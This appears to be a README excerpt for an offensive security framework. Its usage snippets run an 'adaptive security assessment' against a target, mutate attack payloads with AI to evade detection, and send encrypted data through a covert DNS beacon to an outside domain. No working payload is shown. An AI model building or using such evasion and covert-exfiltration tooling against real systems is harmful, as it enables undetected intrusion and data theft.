### Quick Start
```bash
# Run the quickstart script
./quickstart.sh

# Or run directly
python -m OWN_PACKAGE.pwn
Usage

Basic Operation

```python
from OWN_PACKAGE.pwn import main
from OWN_PACKAGE.phases import adaptive_mutator, dns_beacon

# Initialize the framework
controller = main.OWNController()

# Run adaptive security assessment
results = controller.run_assessment(target="example.com")
```

Module Examples

```python
# AI-driven payload mutation
from OWN_PACKAGE.phases.adaptive_mutator import AdaptiveMutator
mutator = AdaptiveMutator()
mutated_payload = mutator.mutate(original_payload)

# Covert DNS communication
from OWN_PACKAGE.phases.dns_beacon import DNSBeacon
beacon = DNSBeacon(domain="example.com")
beacon.send_data(encrypted_data)
```
